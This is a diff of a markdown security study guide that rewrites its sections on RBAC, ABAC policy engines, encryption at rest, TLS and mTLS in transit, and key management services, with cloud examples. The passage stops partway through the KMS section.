+1. Cluster admin creates `ClusterRole deployer` with rules: `apiGroups: ["apps"], resources: ["deployments"], verbs: ["get", "list", "update", "patch"]`.
+2. `ServiceAccount ci-bot` in namespace `production` is bound via `RoleBinding` to `deployer`.
+3. CI pipeline obtains a token for `ci-bot` and calls the Kubernetes API to patch a Deployment image.
+4. API server authenticates the token, resolves bindings, checks RBAC — patch allowed.
+5. Same token attempting `delete pods` — no verb in role → **403 Forbidden**.
+
+Kubernetes documents this Role / RoleBinding model as its native RBAC — verifiable in any cluster's `kubectl auth can-i` checks.
 
 ---
 
 ## 10.8 ABAC
 
-### What is ABAC?
+### Overview
 
-**Attribute-based access control (ABAC)** makes authorization decisions using **attributes** of the user, resource, and environment — not just static roles.
+A job title says you are a Manager, but policy also cares whether you are in the right department, accessing data during business hours, from a company laptop. **Attribute-based access control (ABAC)** evaluates those **attributes** — about the user, the resource, and the environment — instead of relying on a static role alone.
 
-Attributes may belong to:
+Technically, ABAC uses a **policy engine** that evaluates rules over attributes: `user.department`, `resource.classification`, `environment.ip`, `environment.time`. Decisions are **ALLOW** or **DENY** based on Boolean policy logic, often written in languages like Cedar, Rego (OPA), or XACML.
 
-- **User** — department, role, clearance level, location
-- **Resource** — owner, classification, department, sensitivity
-- **Environment** — time, IP address, device type, risk score
+---
 
-### Why ABAC?
+### What problem it fixes
 
-| Benefit | Description |
-|---------|-------------|
-| Fine-grained control | Rules based on multiple conditions |
-| Dynamic policies | Access changes with context without reassigning roles |
-| Centralized rules | Policy engine evaluates complex logic |
+RBAC breaks down when access depends on **context**:
 
-### ABAC rule examples
+- Finance users may read Finance documents only.
+- Managers may approve expenses only 09:00–18:00.
+- High-risk logins from unknown countries are denied even for valid roles.
+- Field-level privacy — hide `salary` from non-HR viewers.
 
-**Department match:**
+Hard-coding such rules as hundreds of special roles becomes unmaintainable. ABAC centralizes **dynamic policies** that combine multiple conditions.
 
-```text
-User department: Finance
-Document department: Finance
-Rule: allow if departments match
-```
+---
 
-**Time + role:**
+### What it does
 
-```text
-User role = Manager AND time = business hours → allow access
-```
+ABAC considers three attribute families:
 
-**Policy form:**
+| Family | Examples |
+|--------|----------|
+| **User** | department, clearance, title, location |
+| **Resource** | owner, sensitivity, department, type |
+| **Environment** | time, IP, device trust, risk score |
+
+Policies express rules:
 
 ```text
-IF user.role = Manager
+IF user.role = "Manager"
 AND resource.department = user.department
 AND environment.time BETWEEN 09:00 AND 18:00
 THEN ALLOW
 ELSE DENY
 ```
 
-### Policy-based authorization
+Supports **object-level** (this order ID), **field-level** (mask salary), and **context-aware** (VPN-only) authorization.
 
-Permissions defined using **policies** evaluated by a policy engine.
+---
+
+### How it works — the architecture inside
+
+#### Policy engine flow
 
 ```text
-Policy: allow if role = ADMIN
-Policy: allow if user owns resource
-
-Policy engine → ALLOW or DENY
+Request + user attributes + resource attributes + environment
+→ policy engine evaluates rules → ALLOW or DENY
 ```
-
-**Benefits:** flexible · centralized management
-
-### Object-level authorization
-
-Authorization on a **specific resource instance** using ownership or resource attributes.
 
 ```text
 GET /orders/123
-Does user A own order 123?
-  Yes → allow
-  No  → deny
+Attributes: user.id=A, resource.owner=A → ALLOW (ownership)
+Attributes: user.id=B, resource.owner=A → DENY
 ```
 
-**Common in:** e-commerce · banking · document systems
+#### Policy-based vs ad hoc checks
 
-### Field-level authorization
+```text
+Bad:  scattered if statements in every handler
+Good: centralized policies in OPA/Cedar → same decision everywhere
+```
 
-Different users see different fields — controlled by user and data attributes.
+#### Field-level example
 
 ```text
 Customer record: name, email, salary
 
-Manager:  all fields
-Employee: name and email only
+Policy: salary visible only if user.department = "HR"
+Manager sees name, email; HR sees all fields
 ```
 
-**Benefits:** data privacy · fine-grained control
+#### Centralized vs decentralized
 
-### Time-based authorization
-
-Access depends on time attributes.
+| | Centralized (OPA sidecar) | Decentralized |
+|---|---------------------------|---------------|
+| **Pros** | One policy repo; consistent audits | No extra network hop |
+| **Cons** | Latency; availability dependency | Drift between services |
 
 ```text
-Allow: 09:00 AM to 06:00 PM
-Outside business hours → access denied
+Microservice → POST /v1/data/authz/allow with JSON input → OPA → true/false
 ```
 
-**Used in:** corporate systems · secure environments
-
-### Context-aware authorization
-
-Decisions use runtime **environment** attributes:
-
-- User location
-- Device type
-- Network source
-- Risk score
-- Time of day
-
-**Examples:**
-
-- Allow only from company network
-- Allow only from approved devices
-- Deny if risk score is high
-
-### ABAC in microservices
+#### Combining RBAC + ABAC
 
 ```text
-User → API gateway → policy engine (attribute store) → microservice
+Step 1 RBAC: user must have role ANALYST (coarse gate)
+Step 2 ABAC: resource.region must equal user.region (fine gate)
 ```
 
-Authorization info travels via tokens (claims as attributes) or is looked up at decision time.
-
-**Common approaches:** policy engines (OPA, Cedar) · OAuth scopes + attribute enrichment
-
-### Centralized vs decentralized ABAC
-
-| | Centralized | Decentralized |
-|---|-------------|---------------|
-| **Model** | Dedicated authorization service + policy store | Each service owns its policies |
-| **Benefits** | Consistent rules; easier governance | Simpler architecture; lower dependency |
-| **Challenges** | Extra service to run | Rule duplication; inconsistent policies |
-
-```text
-Centralized:
-Application → authorization service → policy store → ALLOW or DENY
+```mermaid
+flowchart LR
+    Req[API request] --> Gather[Gather attributes]
+    Gather --> UserAttr[User dept role]
+    Gather --> ResAttr[Resource owner class]
+    Gather --> EnvAttr[Time IP risk]
+    UserAttr --> Engine[Policy engine]
+    ResAttr --> Engine
+    EnvAttr --> Engine
+    Engine --> Decision{ALLOW?}
+    Decision -->|Yes| OK[Proceed]
+    Decision -->|No| Deny[403]
 ```
 
-### ABAC architecture
+---
 
-```text
-Client → API Gateway → Authorization Service → Policy Store + User Store → ALLOW or DENY
-```
+### Pitfalls and design tips
 
-### RBAC vs ABAC
+- **Start with RBAC; add ABAC where context matters** — full ABAC day one is hard to test and audit.
+- **Keep policies in version control** — treat Rego/Cedar like code; review and CI-test policy changes.
+- **Watch evaluation latency** — complex policies per request may need caching with careful invalidation.
+- **Define attribute schema** — missing `resource.owner` should default deny, not crash.
+- **OPA (Open Policy Agent)** and **AWS Cedar** are production-grade engines worth naming in interviews.
+- **Do not confuse ABAC with OAuth scopes** — scopes are coarse strings; ABAC evaluates rich attribute tuples.
 
-| | RBAC | ABAC |
-|---|------|------|
-| **Based on** | Roles and permissions | Attributes and policies |
-| **Flexibility** | Lower | Higher |
-| **Complexity** | Simpler to implement | Requires policy engine |
-| **Best for** | Stable role hierarchies | Dynamic, context-sensitive rules |
+---
 
-Many production systems combine both: **RBAC for coarse access**, **ABAC for fine-grained rules**.
+### Real-world example
 
-### Summary
+**AWS IAM policy with attribute conditions (ABAC-style)**
 
-```text
-ABAC = decisions from user + resource + environment attributes
-Use policy engine for complex rules (department, time, location, ownership)
-Combine with RBAC: roles for broad access, attributes for context-specific rules
-```
+1. S3 objects are tagged `Department=Finance` at upload.
+2. IAM user Alice has tag `Department=Finance` on her principal.
+3. IAM policy allows `s3:GetObject` only when `aws:PrincipalTag/Department` equals `s3:ResourceTag/Department`.
+4. Alice reads `s3://corp-data/report-q1` tagged Finance — **allow**.
+5. Bob tagged `Department=Engineering` requests the same object — **deny** despite both having generic `s3:GetObject` on the bucket ARN pattern.
+
+AWS documents this **attribute-based access control** pattern with principal and resource tags — a verifiable cloud ABAC deployment.
 
 ---
 
 ## 10.9 Encryption at Rest
 
-### What is encryption at rest?
+### Overview
 
-**Encryption at rest** encrypts data while it is stored on persistent storage. Data is encrypted before being written to storage and decrypted when accessed by authorized users or services.
+Sensitive papers belong in a locked filing cabinet, not on an open desk. **Encryption at rest** scrambles data before it lands on disk, database files, backups, or object storage so anyone who steals the drive or snapshot sees meaningless ciphertext without the key.
 
-**Purpose:** protect stored data from unauthorized access if storage media is compromised.
+Technically, encryption at rest uses symmetric algorithms (usually **AES-256**) to transform plaintext into ciphertext at write time and reverse the process on read for authorized components holding the key. Keys themselves are rarely stored next to data — **envelope encryption** and **KMS** (10.11) protect data encryption keys with master keys.
 
-**Examples:**
+---
 
-- Database records
-- Files
-- Object storage
-- Backups
-- Snapshots
-- Log files
+### What problem it fixes
 
-### Why encrypt data at rest?
-
-**Without encryption:**
+Storage media is copied, lost, and breached:
 
 ```text
-Attacker gains access to hard disk, database backup, or storage volume
-→ data can be read directly
+Without encryption: attacker copies database file → reads salaries and emails in plaintext
+With encryption:    attacker copies file → sees XJ29KSLA92M8PQR without the key
 ```
 
-**With encryption:**
+Encryption at rest addresses:
+
+- **Stolen laptops and disks** — physical theft.
+- **Backup exposure** — backups often live in more places than production DBs.
+- **Cloud misconfiguration** — public snapshot of an encrypted volume still needs keys, but unencrypted snapshot is instant breach.
+- **Compliance** — PCI-DSS, HIPAA, and GDPR commonly expect encryption of sensitive stored data.
+
+It does **not** protect data **in transit** (10.10) or **in use** in memory — those need TLS and other controls.
+
+---
+
+### What it does
+
+Encryption at rest:
+
+1. **Encrypts** data before persistence (application, database engine, or storage layer).
+2. **Decrypts** only for authorized readers with valid keys.
+3. **Applies at varying granularity** — column, row, table, file, volume, or bucket.
+4. **Pairs with key management** — rotation, access control, audit (KMS).
+
+| Data state | Protected by |
+|------------|--------------|
+| **At rest** | This section — disk, DB, backups |
+| **In transit** | TLS (10.10) |
+| **In use** | Confidential computing, access control (emerging) |
+
+---
+
+### How it works — the architecture inside
+
+#### Write and read paths
 
 ```text
-Attacker gains access to storage → data appears unreadable without encryption keys
+Write: Application → encrypt(plaintext, DEK) → ciphertext → disk/DB
+Read:  disk/DB → ciphertext → decrypt(ciphertext, DEK) → application
 ```
 
-**Benefits:**
+#### Symmetric encryption (AES)
 
-- Data confidentiality
-- Regulatory compliance
-- Reduced breach impact
-- Protection against physical theft
-
-### Data states
-
-Data generally exists in three states:
-
-| State | Description |
-|-------|-------------|
-| **Data at rest** | Stored in databases, disks, backups |
-| **Data in transit** | Moving across networks |
-| **Data in use** | Being processed in memory |
-
-Encryption at rest focuses only on **stored data**.
-
-### Where encryption at rest is used
-
-- Databases
-- File systems
-- Object storage
-- Data warehouses
-- Backups
-- Archive storage
-- Log storage
-- Cloud storage
-
-### High-level flow
-
-**Write:**
+Same secret key encrypts and decrypts — fast for large data.
 
 ```text
-Application → encrypt data → store data → disk / database
+Plaintext → AES-256 + key → Ciphertext
+Ciphertext → AES-256 + same key → Plaintext
 ```
 
-**Read:**
+**Common key sizes:** AES-128, AES-256 (enterprise default).
+
+Asymmetric encryption (RSA) is too slow for bulk data; it typically wraps **keys**, not whole tables.
+
+#### Granularity options
+
+| Level | What is encrypted | Trade-off |
+|-------|-------------------|-----------|
+| **Column** | Email, SSN columns only | Selective; app must handle |
+| **Table** | Entire payment table | Simpler; all-or-nothing |
+| **TDE** | Database engine encrypts files on disk | Transparent to app |
+| **Volume / bucket** | EBS volume, S3 bucket | Infrastructure-level |
+
+**Transparent Data Encryption (TDE):** SQL Server, Oracle, PostgreSQL extensions encrypt data files automatically — application SQL unchanged.
+
+#### Envelope encryption (preview)
 
 ```text
-Disk / database → decrypt data → application
+Data encrypted with DEK (data encryption key)
+DEK encrypted with CMK (customer master key in KMS)
+Store: ciphertext + encrypted_DEK
 ```
 
-### Encryption process
+Detailed flow in 10.11 KMS.
 
-```text
-Plaintext → encryption algorithm + encryption key → ciphertext → storage
+#### Performance
+
+AES hardware acceleration (AES-NI) makes overhead small for most workloads. Column-level encryption adds application CPU; TDE adds DB engine overhead — usually acceptable versus breach cost.
+
+```mermaid
+flowchart LR
+    App[Application] --> Enc[Encrypt with DEK]
+    Enc --> Store[(Database or object storage)]
+    Store --> Cipher[Ciphertext at rest]
+    KMS[KMS] --> DEK[Data encryption key]
+    DEK --> Enc
+    Read[Authorized read] --> Store
+    Store --> Dec[Decrypt with DEK]
+    Dec --> App
 ```
 
-**Example:**
+---
 
-```text
-Original: Customer Salary
-Stored:   XJ29KSLA92M8PQR
-```
+### Pitfalls and design tips
 
-### Decryption process
+- **Encryption without key protection is theater** — keys in source code or config repos negate the benefit; use KMS.
+- **Encrypt backups and replicas** — attackers target the weakest copy.
+- **TDE protects disk, not privileged DB users** — DBA with full access still sees plaintext; combine with access control and column encryption for highly sensitive fields.
+- **Plan key rotation** — envelope encryption lets you re-wrap DEKs without re-encrypting all data at once in some designs.
+- **Cloud defaults:** enable S3 SSE-KMS, RDS encryption at create time (often cannot enable later without migration), EBS encrypted volumes.
+- **Interview:** at rest = stored; in transit = TLS; do not conflate the two.
 
-```text
-Ciphertext → decryption algorithm + encryption key → original data
-```
+---
 
-Only authorized systems possessing the correct key can decrypt data.
+### Real-world example
 
-### Plaintext vs ciphertext
+**Amazon S3 with SSE-KMS**
 
-| | Plaintext | Ciphertext |
-|---|-----------|------------|
-| **Description** | Original readable data | Encrypted unreadable data |
-| **Example** | John Doe | A92JKSLP1MZZ |
+1. Application uploads `payroll-2025-q1.csv` to bucket `corp-hr-data`.
+2. S3 API call includes `ServerSideEncryption=aws:kms` and `SSEKMSKeyId=arn:aws:kms:…:key/abc`.
+3. S3 requests a data key from **AWS KMS**, encrypts the object bytes, and stores ciphertext plus encrypted data key metadata.
+4. Auditor with only S3 read but no `kms:Decrypt` on the CMK cannot read object contents.
+5. Authorized HR app role has `s3:GetObject` and `kms:Decrypt` — S3 fetches object, KMS decrypts DEK, S3 returns plaintext to the app over HTTPS.
 
-### Symmetric encryption
-
-Same key used for encryption and decryption.
-
-**Encrypt:**
-
-```text
-Plaintext → secret key → encryption → ciphertext
-```
-
-**Decrypt:**
-
-```text
-Ciphertext → same secret key → decryption → plaintext
-```
-
-### AES (Advanced Encryption Standard)
-
-Most commonly used algorithm for encryption at rest.
-
-**Features:** fast · secure · industry standard
-
-**Common key sizes:** AES-128 · AES-192 · AES-256
-
-Most enterprise systems use **AES-256**.
-
-### Asymmetric encryption
-
-Uses two keys:
-
-| Key | Role |
-|-----|------|
-| **Public key** | Encrypt |
-| **Private key** | Decrypt |
-
-Typically not used directly for large data encryption due to performance cost. Often used to **protect encryption keys**.
-
-### Envelope encryption (overview)
-
-Cloud systems encrypt data with a **DEK** (data key), then encrypt the DEK with a **KEK** (master key). Full envelope flows and KMS integration are in **KMS** below.
-
-### Database encryption
-
-Database stores encrypted values.
-
-**Before:**
-
-```text
-Name = John
-Salary = 100000
-```
-
-**After:**
-
-```text
-Name = encrypted
-Salary = encrypted
-```
-
-Stored data becomes unreadable without proper decryption keys.
-
-### Column-level encryption
-
-Only selected columns are encrypted.
-
-```text
-Customer: Name, Email, Salary
-
-Encrypt: Email, Salary
-Leave:   Name
-```
-
-**Benefits:** better performance · selective protection
-
-### Row-level encryption
-
-Entire rows encrypted before storage.
-
-```text
-Customer record → entire record encrypted as a unit
-```
-
-Used when complete record confidentiality is required.
-
-### Table-level encryption
-
-Entire database table encrypted.
-
-```text
-Payment table → encrypted completely
-```
-
-| Benefits | Challenges |
-|----------|------------|
-| Simpler management | Less flexibility |
-
-### Transparent data encryption (TDE)
-
-Database automatically encrypts data stored on disk. Application remains unchanged.
-
-```text
-Application → database → automatic encryption → disk
-```
-
-**Examples:** SQL Server TDE · Oracle TDE · PostgreSQL extensions
-
-### File system encryption
-
-Storage layer performs encryption.
-
-**Examples:** encrypted volumes · encrypted partitions · encrypted SSD storage
-
-Applications are usually unaware of the encryption process.
-
-### Object storage encryption
-
-Used in cloud object storage for documents, images, videos, and backups. Objects are encrypted before being persisted.
-
-### Backup encryption
-
-Backups often contain sensitive data.
-
-```text
-Backup → encrypt → store
-```
-
-Protection required because backups are frequently copied and transported.
-
-### Key management (overview)
-
-Encryption security depends on key lifecycle: creation, storage, rotation, revocation. **KMS** below covers master keys, envelope encryption, HSM, and cloud key services in detail.
-
-### Performance considerations
-
-Encryption introduces overhead.
-
-**Operations affected:** write performance · read performance · CPU utilization
-
-Modern hardware acceleration reduces much of this impact.
-
-### Compliance requirements
-
-Many regulations require protection of stored sensitive data.
-
-**Examples:** financial records · personal information · healthcare records · payment information
-
-Encryption at rest is often a **mandatory** security control.
-
-### High-level architecture
-
-```text
-Application → Encryption Service/SDK → Database/File Storage → Encrypted Data → KMS/HSM
-```
-
-### Summary
-
-```text
-Encryption at rest = protect stored data (DB, files, backups, object storage)
-Use AES-256 symmetric encryption; envelope encryption (DEK + KEK) in cloud
-TDE for transparent DB encryption; manage keys with rotation, HSM, or cloud KMS
-```
+AWS documents SSE-KMS as server-side encryption at rest for S3 objects — a standard production pattern.
 
 ---
 
 ## 10.10 Encryption in Transit
 
-### What is encryption in transit?
+### Overview
 
-**Encryption in transit** protects data while it moves between systems, applications, services, or users over a network.
+Sending a postcard exposes your message to everyone along the route; a sealed courier envelope does not. **Encryption in transit** wraps data moving across networks — browser to server, API to API, app to database — so interceptors see useless ciphertext instead of passwords, tokens, and personal data.
 
-**Purpose:** prevent unauthorized parties from reading or modifying data during transmission.
+Technically, **TLS (Transport Layer Security)** is the standard: asymmetric cryptography establishes trust and negotiates a shared **session key**, then symmetric **AES** encrypts bulk traffic for speed. **HTTPS** is HTTP over TLS. **mTLS** adds client certificates so both ends prove identity — common inside service meshes.
 
-**Examples:**
+---
 
-- Browser to web server
-- Mobile app to backend API
-- Microservice to microservice
-- Database client to database
-- API gateway to services
+### What problem it fixes
 
-### Why encrypt data in transit?
-
-**Without encryption:**
+Unencrypted network traffic is readable by anyone on the path — compromised Wi‑Fi, ISP equipment, malicious hops, or tapped datacenter links.
 
 ```text
-Client → internet → server
-
-Anyone intercepting traffic may read:
-  passwords, tokens, credit card data, personal information
+Without TLS: POST /login body password=secret123 visible in packet capture
+With TLS:    same bytes appear as random noise without session keys
 ```
 
-**With encryption:**
+TLS also provides **integrity** (tampering detection) and **server authentication** (certificate proves you reached real `example.com`, not a phishing host).
+
+---
+
+### What it does
+
+Encryption in transit:
+
+1. **Encrypts** request and response bodies and headers (except SNI and some metadata).
+2. **Authenticates** the server (and optionally the client with mTLS).
+3. **Detects tampering** via authenticated encryption and handshake verification.
+4. **Applies everywhere data moves** — public internet, internal VPC (defense in depth), database wire protocol.
+
+---
+
+### How it works — the architecture inside
+
+#### TLS handshake (simplified)
 
 ```text
-Client → encrypted traffic → server
-
-Intercepted traffic appears unreadable
+Client Hello     → supported ciphers, TLS version, random
+Server Hello     → chosen cipher, certificate, random
+Certificate      → server public key + CA signature
+Key exchange     → client verifies cert → derives session key
+Secure channel   → AES encrypts application data
 ```
-
-**Benefits:**
-
-- Confidentiality
-- Integrity
-- Authentication
-- Protection against eavesdropping
-
-### Data states
-
-Data exists **at rest** (stored), **in transit** (network), and **in use** (memory). Encryption in transit protects data **while it travels across networks**.
-
-### Common use cases
-
-- HTTPS websites
-- REST APIs
-- GraphQL APIs
-- Microservices
-- Database connections
-- Cloud communication
-- File transfers
-- Email communication
-
-### High-level flow
 
 ```text
-Client → encrypt data → network → decrypt data → server
+Note: "SSL certificate" in conversation usually means TLS certificate — SSL is legacy
 ```
 
-**Example:**
+#### HTTPS
 
 ```text
-Browser → encrypted request → web server
-Web server → encrypted response → browser
+http://example.com  → no encryption
+https://example.com → HTTP inside TLS tunnel
 ```
 
-### TLS (Transport Layer Security)
+Browsers show padlock when certificate is valid and chain trusted.
 
-TLS is the standard protocol for encryption in transit.
+#### Session keys and bulk encryption
 
-**Used by:** HTTPS · secure APIs · secure email · database connections
-
-**TLS provides:** confidentiality · integrity · authentication
-
-### SSL vs TLS
-
-| | SSL | TLS |
-|---|-----|-----|
-| **Status** | Older protocol | Modern replacement |
-| **Today** | Legacy term | What systems actually use |
-
-When people say "SSL certificate," they usually mean **TLS certificates**. Modern systems use TLS.
-
-### HTTPS
-
-HTTPS = HTTP + TLS
+Asymmetric crypto (RSA/ECDHE) is slow for large payloads. Handshake produces a symmetric **session key**; data plane uses **AES-GCM** or ChaCha20-Poly1305.
 
 ```text
-http://example.com   → no encryption
-https://example.com  → encrypted communication
+Handshake (asymmetric) → session key → encrypt all HTTP messages (symmetric)
 ```
 
-**Benefits:** secure communication · user trust · data protection
+#### mTLS (mutual TLS)
 
-### TLS handshake
-
-Before secure communication begins, client and server perform a handshake.
+| | TLS | mTLS |
+|---|-----|------|
+| **Server identity** | Verified | Verified |
+| **Client identity** | Not verified | Verified via client certificate |
 
 ```text
-Client Hello → Server Hello → Certificate → Key Exchange → Secure Channel
+Service A presents client cert → Service B validates against trusted CA → both directions encrypted
 ```
 
-**Purpose:** establish trust · negotiate cipher · exchange keys · create session key for bulk encryption
+Used in: Kubernetes service mesh (Istio), internal banking APIs, zero-trust service communication.
 
-### Client Hello
-
-Client initiates the TLS connection.
-
-**Information sent:**
-
-- Supported TLS versions
-- Supported cipher suites
-- Random value
+#### TLS termination
 
 ```text
-Browser → client hello → server
+Internet client → HTTPS → load balancer (terminates TLS) → HTTP or mTLS → app servers
 ```
 
-### Server Hello
+Centralizes certificate renewal (e.g. cert-manager + Let's Encrypt) and reduces per-app crypto load. Traffic **behind** the balancer should still be encrypted on untrusted networks.
 
-Server responds with:
-
-- Selected TLS version
-- Selected cipher suite
-- Server certificate
-- Random value
+#### Database connections
 
 ```text
-Client hello → server hello → certificate exchange
+Application → TLS wrapper → PostgreSQL / MySQL (sslmode=require)
 ```
 
-### Digital certificate
+Prevents credential and row data exposure on the DB network segment.
 
-Certificate proves server identity.
-
-**Contains:**
-
-- Domain name
-- Public key
-- Certificate authority signature
-
-```text
-example.com → certificate → public key
+```mermaid
+flowchart LR
+    Client[Browser or client] --> Hello[TLS Client Hello]
+    Hello --> Server[Server certificate]
+    Server --> Verify[Verify CA and hostname]
+    Verify --> SessionKey[Derive session key]
+    SessionKey --> EncChannel[Encrypted HTTP or API traffic]
+    EncChannel --> App[Application server]
 ```
 
-### Certificate authority (CA)
+---
 
-Trusted organization that issues digital certificates.
+### Pitfalls and design tips
 
-**Responsibilities:**
+- **Terminate TLS only on trusted network segments** — HTTP between LB and app in shared tenancy may need TLS or private network isolation.
+- **Disable old TLS versions** — TLS 1.2+ only; SSLv3 and TLS 1.0 are broken.
+- **Validate hostname against certificate SAN** — not just chain trust.
+- **Rotate certificates before expiry** — automate with Let's Encrypt, cert-manager, or cloud ACM; expired certs cause outages.
+- **HSTS** — `Strict-Transport-Security` header prevents SSL stripping on repeat visitors.
+- **mTLS operational cost** — certificate issuance and rotation per service; service meshes automate this.
+- **Default:** HTTPS everywhere public; mTLS or mesh for east-west microservice traffic in regulated environments.
 
-- Verify ownership
-- Issue certificates
-- Establish trust
+---
 
-```text
-Server → requests certificate → CA issues certificate → clients trust server
-```
+### Real-world example
 
-### Public key cryptography
+**Let's Encrypt certificate on nginx**
 
-TLS uses asymmetric encryption during initial connection setup.
+1. Operator configures nginx for `https://shop.example.com` with a self-signed or missing cert — browsers warn.
+2. **Certbot** runs ACME HTTP-01 challenge; Let's Encrypt CA verifies domain control.
+3. Let's Encrypt issues a 90-day TLS certificate; Certbot installs it in nginx `ssl_certificate` path.
+4. Customer POSTs checkout with card data — TLS 1.3 encrypts the body; packet capture shows encrypted records only.
+5. Certbot cron renews at day 60; nginx reloads — no manual purchase workflow.
 
-| Key | Role |
-|-----|------|
-| **Public key** | Shared openly — encrypt |
-| **Private key** | Kept secret — decrypt |
-
-```text
-Public key → encrypt → private key → decrypt
-```
-
-### Session key
-
-After handshake, TLS creates a **session key** to encrypt actual communication.
-
-**Why?** Symmetric encryption is much faster than asymmetric encryption.
-
-```text
-Handshake → session key created → data encrypted using session key
-```
-
-### Symmetric encryption in TLS
-
-Used after connection establishment.
-
-**Characteristics:** fast · efficient · suitable for large data transfer
-
-**Common algorithm:** AES
-
-```text
-Shared session key → encrypt traffic → decrypt traffic
-```
-
-### TLS flow
-
-```text
-Client → TLS handshake → certificate verification → session key → secure channel → encrypted communication
-```
-
-### Data confidentiality
-
-Only intended parties can read data.
-
-```text
-Password → encrypted → network → server
-
-Interceptor cannot understand contents
-```
-
-### Data integrity
-
-Ensures transmitted data is not altered.
-
-```text
-Original data → integrity check → transmission → verification
-```
-
-If data changes, the connection may be rejected.
-
-### Server authentication
-
-Client verifies server identity.
-
-```text
-Browser → verify certificate → verify domain → trust server
-```
-
-Prevents fake servers from impersonating legitimate services.
-
-### Mutual TLS (mTLS)
-
-| | Normal TLS | Mutual TLS (mTLS) |
-|---|------------|-------------------|
-| **Server** | Authenticated | Authenticated |
-| **Client** | Not authenticated | Authenticated |
-
-```text
-Client certificate → server validation → mutual trust
-```
-
-### mTLS in microservices
-
-```text
-Service A → TLS connection → Service B
-```
-
-Both services verify each other's certificates.
-
-**Benefits:** strong identity verification · secure internal communication
-
-### Database connection encryption
-
-```text
-Application → TLS → database
-
-Application → encrypted connection → MySQL
-Application → encrypted connection → PostgreSQL
-```
-
-### API security using TLS
-
-```text
-Client → HTTPS request → API gateway → microservices
-```
-
-Tokens and credentials travel through encrypted channels.
-
-**Commonly protects:** JWT tokens · API keys · OAuth tokens
-
-### TLS termination
-
-Load balancer often handles TLS.
-
-```text
-Client → HTTPS → load balancer → HTTP/TLS → application servers
-```
-
-**Benefits:** reduced server workload · centralized certificate management
-
-### Certificate renewal
-
-Certificates have expiration dates.
-
-```text
-Certificate → expires → renew → deploy updated certificate
-```
-
-**Benefits:** continued trust · improved security
-
-### High-level architecture
-
-```text
-Client → HTTPS/TLS → Load Balancer → Service A ↔ mTLS ↔ Service B → Database + Cache
-```
-
-All communication channels are encrypted during transmission.
-
-### Summary
-
-```text
-Encryption in transit = protect data moving over the network (TLS/HTTPS)
-TLS handshake → certificate verification → session key → AES for bulk traffic
-Use mTLS for service-to-service; terminate TLS at load balancer when appropriate
-```
+Let's Encrypt and nginx document this free automated HTTPS path used by millions of sites.
 
 ---
 
 ## 10.11 KMS
 
-### What is KMS?
+### Overview
 
-**KMS (Key Management Service)** securely creates, stores, manages, rotates, and controls cryptographic keys.
+Encrypting files is useless if the key sits on a sticky note on the monitor. A **Key Management Service (KMS)** is the vault for cryptographic keys — it generates, stores, rotates, and audits use of keys so applications never embed secrets in code or config.
 
-Instead of applications managing keys directly, they delegate key operations to KMS.
-
-**Purpose:** protect encryption keys throughout their lifecycle.
-
-### Why do we need KMS?
-
-Encryption is only as secure as the encryption keys.
-
-**Bad practice:**
-
-```text
-Application → store encryption key inside source code
-```
-
-**Problems:** key exposure · difficult rotation · poor auditing · security risks
-
-**Better approach:**
-
-```text
-Application → KMS → key operations
-```
-
-**Benefits:**
-
-- Centralized key management
-- Better security
-- Easier auditing
-- Simplified rotation
-
-### Responsibilities of KMS
-
-- Key generation
-- Key storage
-- Key rotation
-- Key access control
-- Key revocation
-- Key deletion
-- Audit logging
-- Encryption operations
-- Decryption operations
-
-### High-level architecture
-
-```text
-Application → KMS → Encryption Operations + Key Store
-```
-
-### Key lifecycle
-
-```text
-Create key → store key → use key → rotate key → disable key → delete key
-```
-
-Every key follows a lifecycle.
-
-### Key generation
-
-KMS generates cryptographically secure keys using secure random generators.
-
-```text
-Example: AES-256 key — generated inside KMS
-```
-
-Applications never create keys manually.
-
-### Key storage
-
-Keys are stored securely.
-
-**Characteristics:** encrypted storage · access controlled · tamper resistant · auditable
-
-Applications typically cannot directly view key material.
-
-### Customer master key (CMK)
-
-Master key managed by KMS.
-
-**Purpose:** protect other encryption keys
-
-**Used for:** encrypting DEKs · signing operations · encryption operations
-
-```text
-CMK → encrypts DEK
-```
-
-### Data encryption key (DEK)
-
-Key used to encrypt actual data.
-
-```text
-Customer record → DEK encrypts data
-```
-
-DEKs are usually short-lived and used only for data encryption.
-
-### Envelope encryption
-
-Most common KMS pattern.
-
-```text
-Data → encrypted using DEK → DEK encrypted using CMK → store data + encrypted DEK
-```
-
-**Benefits:** faster encryption · better scalability · reduced KMS load
-
-### Envelope encryption flow
-
-```text
-Application → request DEK → KMS generates DEK → encrypt data → KMS encrypts DEK with CMK → store encrypted data + encrypted DEK
-```
-
-### Decryption flow
-
-```text
-Application → read encrypted data + encrypted DEK → KMS decrypts DEK → application decrypts data
-```
-
-### Key rotation
-
-Keys should be periodically replaced.
-
-```text
-Old key → new key → future encryptions use new key
-```
-
-**Benefits:** reduced risk · compliance requirements · limits impact of key compromise
-
-### Automatic key rotation
-
-KMS can rotate keys automatically.
-
-**Examples:** every 90 days · every year
-
-New versions created without changing application logic.
-
-### Key versioning
-
-A key may have multiple versions.
-
-```text
-CustomerKey
-  Version 1
-  Version 2
-  Version 3
-```
-
-Old data can still be decrypted using older key versions.
-
-### Access control
-
-Not every application should access every key.
-
-```text
-Order service   → order key
-Payment service → payment key
-```
-
-**Benefits:** principle of least privilege · better isolation
-
-### Key policies
-
-Rules defining who can use keys.
-
-```text
-Allow: payment service
-Deny:  inventory service
-```
-
-**Operations controlled:** encrypt · decrypt · rotate · delete
-
-### Audit logging
-
-Every key operation should be logged.
-
-**Examples:**
-
-- Who used the key?
-- When was it used?
-- Which service used it?
-
-**Operations:** encrypt · decrypt · rotate · delete
-
-### Hardware security module (HSM)
-
-Dedicated hardware device used for secure key protection.
-
-**Characteristics:** tamper resistant · hardware isolated · highly secure
-
-Many KMS implementations use HSMs internally.
-
-### Managed KMS
-
-Cloud providers offer managed KMS.
-
-**Responsibilities:**
-
-- Key generation
-- Storage
-- Rotation
-- Auditing
-- Access control
-
-Applications interact through APIs.
-
-### Application integration
-
-```text
-Application → call KMS API → encrypt / decrypt → receive result
-```
-
-Applications should **never** hardcode encryption keys.
-
-### Database encryption with KMS
-
-```text
-Application → generate DEK → encrypt customer data → store encrypted data
-
-KMS → protects DEK using CMK
-```
-
-### File storage with KMS
-
-```text
-Upload file → generate DEK → encrypt file → store file
-```
-
-Encrypted DEK stored alongside file. KMS protects master keys.
-
-### Microservices and KMS
-
-```text
-Order service    → KMS
-Payment service  → KMS
-Customer service → KMS
-```
-
-Each service may have separate keys and permissions.
-
-### Benefits of KMS
-
-- Centralized management
-- Secure key storage
-- Automatic rotation
